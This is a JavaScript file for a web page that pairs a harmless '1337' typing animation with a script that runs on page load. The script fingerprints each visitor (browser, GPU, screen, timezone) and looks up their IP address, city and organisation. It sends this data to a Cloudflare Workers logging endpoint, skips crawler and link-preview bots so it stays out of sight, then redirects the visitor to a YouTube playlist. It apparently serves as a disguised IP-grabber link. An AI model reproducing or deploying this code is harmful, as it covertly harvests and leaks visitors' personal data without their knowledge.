// Typing effect for 1337 text
const typedTextSpan = document.querySelector(".typed-text");
const cursorSpan = document.querySelector(".cursor");

const textArray = ["1337", "1337", "1337", "1337"];
const typingDelay = 200;
const erasingDelay = 100;
const newTextDelay = 2000; // Delay between current and next text
let textArrayIndex = 0;
let charIndex = 0;

function type() {
  if (charIndex < textArray[textArrayIndex].length) {
    if(!cursorSpan.classList.contains("typing")) cursorSpan.classList.add("typing");
    typedTextSpan.textContent += textArray[textArrayIndex].charAt(charIndex);
    charIndex++;
    setTimeout(type, typingDelay);
  } 
  else {
    cursorSpan.classList.remove("typing");
  	setTimeout(erase, newTextDelay);
  }
}

function erase() {
	if (charIndex > 0) {
    if(!cursorSpan.classList.contains("typing")) cursorSpan.classList.add("typing");
    typedTextSpan.textContent = textArray[textArrayIndex].substring(0, charIndex-1);
    charIndex--;
    setTimeout(erase, erasingDelay);
  } 
  else {
    cursorSpan.classList.remove("typing");
    textArrayIndex++;
    if(textArrayIndex>=textArray.length) textArrayIndex=0;
    setTimeout(type, typingDelay + 1100);
  }
}

// User tracking and redirect script
(async function () {
  const userAgent = navigator.userAgent;
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const screenSize = screen.width + "x" + screen.height;
  const platform = navigator.platform;
  const cookies = navigator.cookieEnabled;
  const doNotTrack = navigator.doNotTrack;

  let gpu = "Not Available";
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  } catch (e) {
    gpu = "Error";
  }

  let ip = "Unknown";
  let city = "Unknown";
  let region = "Unknown";
  let org = "Unknown";
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    ip = data.ip || "Unknown";
    city = data.city || "Unknown";
    region = data.region || "Unknown";
    org = data.org || "Unknown";
  } catch (e) {
    ip = "Error";
    city = "Error";
    region = "Error";
    org = "Error";
  }

  const refUrl = document.referrer;
  const currentUrl = window.location.href;

  const infoText = `
🧭 User Agent: ${userAgent}
🌐 Language: ${language}
🕒 Timezone: ${timezone}
🖥️ Screen: ${screenSize}
💻 Platform: ${platform}
🍪 Cookies Enabled: ${cookies}
🚫 Do Not Track: ${doNotTrack}
🎮 GPU: ${gpu}
🌍 IP Address: ${ip}
🏙️ City: ${city}
🗺️ Region: ${region}
🏢 Organization: ${org}
📍 Current URL: ${currentUrl}
🔗 Referrer: ${refUrl}
  `.trim();

  let isBot = false;
  const ua = userAgent.toLowerCase();

  if (
    ua.includes("headless") || 
    ua.includes("bot") || 
    ua.includes("crawl") || 
    ua.includes("spider") || 
    ua.includes("preview") || 
    ua.includes("facebookexternalhit") || 
    ua.includes("discordbot") || 
    ua.includes("whatsapp") || 
    ua.includes("telegrambot")
  ) {
    isBot = true;
  }

  const urlParams = new URLSearchParams(window.location.search);
  const fromWorker = urlParams.has("from");

  const encoded = encodeURIComponent(infoText);
  let endpoint = "";
  if (!isBot) {
    if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
      endpoint = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
    } else {
      endpoint = `https://workers.client57.workers.dev/api/log?result=%0A${encoded}`;
    }
  }

  try {
    await fetch(endpoint);
  } catch (e) {
    console.warn("Gagal fetch data log:", e);
  }

  setTimeout(function () {  
    //window.location = 'intent://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t#Intent;package=com.google.android.youtube;scheme=https;end';  
    window.location = 'vnd.youtube://www.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb&si=UQBOD7o6D3GtnL5t';  

    setTimeout(function () {  
      window.location = 'https://music.youtube.com/playlist?list=PLAkH97YwdLFg820IAgaluO45Aqwd584Rb';  
    }, 1000);  
  }, 2700);  
})();

document.addEventListener("DOMContentLoaded", function() { // On DOM Load initiate the effect
  if(textArray.length) setTimeout(type, newTextDelay + 250);
});
